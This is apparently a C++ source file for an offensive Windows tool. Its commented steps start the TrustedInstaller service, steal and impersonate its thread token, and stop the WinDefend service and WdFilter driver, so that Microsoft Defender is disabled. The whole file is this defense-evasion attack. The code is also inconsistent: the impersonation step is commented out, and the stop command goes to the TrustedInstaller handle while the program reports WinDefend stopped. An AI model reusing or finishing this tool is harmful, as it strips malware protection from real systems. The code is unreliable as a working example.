#include "common.h"

int main()
{
	// load NtDll and resolve the addresses of NtMakeTemporaryObject(), NtOpenSymbolicLinkObject(), and NtCreateSymbolicLinkObject()
	RAII::Hmodule ntdllModule = LoadLibraryW(L"ntdll.dll");
	if (!ntdllModule.GetHmodule())
	{
		std::cout << "[-] Couldn't resolve ntdll address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}

	pNtImpersonateThread NtImpersonateThread = (pNtImpersonateThread)GetProcAddress(ntdllModule.GetHmodule(), "NtImpersonateThread");
	if (!NtImpersonateThread)
	{
		std::cout << "[-] Couldn't resolve NtImpersonateThread address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}

	// changing symlink through ChangeSymlink function
	//auto status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume1");
	//if (status != STATUS_SUCCESS) return 1;

#pragma region killing_driver
	// steps:
	// 1. start the trustedinstaller service & process
	// 2. steal the trustedinstaller process token
	// 3. become TrustedInstaller
	// 4. stop WinDefend
	// 5. stop WdFilter

	// step 1
	RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!svcManager.GetHandle())
	{
		Error(GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to the SCM!\n";

	RAII::ScHandle trustedInstSvc = OpenServiceW(svcManager.GetHandle(), L"TrustedInstaller", SERVICE_START);
	if (!trustedInstSvc.GetHandle())
	{
		Error(GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to the TrustedInstaller service!\n";

	auto success = StartServiceW(trustedInstSvc.GetHandle(), 0, nullptr);
	if (!success && GetLastError() != 0x420)
	{
		std::cout << "[-] Couldn't start TrustedInstaller service...\n";
		return 1;
	}
	else std::cout << "[+] Successfully started the TrustedInstaller service!\n";

	// step 2
	auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
	if (trustedInstPid == ERROR_FILE_NOT_FOUND)
	{
		std::cout << "[-] Couldn't find the TrustedInstaller process...\n";
		return 1;
	}

	auto trustedInstThreadId = GetFirstThreadID(trustedInstPid);
	if (trustedInstThreadId == ERROR_FILE_NOT_FOUND || trustedInstThreadId == 0)
	{
		std::cout << "[-] Couldn't find TrustedInstaller process' first thread...\n";
		return 1;
	}

	RAII::Handle hTrustedInstThread = OpenThread(THREAD_DIRECT_IMPERSONATION, false, trustedInstThreadId);
	if (!hTrustedInstThread.GetHandle())
	{
		std::cout << "[-] Couldn't open a handle to the TrustedInstaller process' first thread...\n";
		return 1;
	}
	else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the TrustedInstaller process' first thread!\n";

	//SECURITY_QUALITY_OF_SERVICE sqos = {};
	//sqos.Length = sizeof(sqos);
	//sqos.ImpersonationLevel = SecurityImpersonation;
	//auto status = NtImpersonateThread(GetCurrentThread(), hTrustedInstThread.GetHandle(), &sqos);
	//if (status == STATUS_SUCCESS) std::cout << "[+] Successfully impersonated TrustedInstaller token!\n";
	//else
	//{
	//	std::cout << "[-] Failed to impersonate TrustedInstaller...\n";
	//	return 1;
	//}

	RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
	if (!winDefendSvc.GetHandle())
	{
		Error(GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to the WinDefend service!\n";

	SERVICE_STATUS_PROCESS servStats{};
	success = ControlService(trustedInstSvc.GetHandle(), SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&servStats);
	if (!success)
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't stop the WinDefend service...\n";
		return 1;
	}
	else std::cout << "[+] Successfully stopped the WinDefend service!\n";

#pragma endregion WdFilter.sys driver is killed and restarted rendering it useless

	// restoring symlink through ChangeSymlink function
	//status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume3");
	//if (status != STATUS_SUCCESS) return 1;
}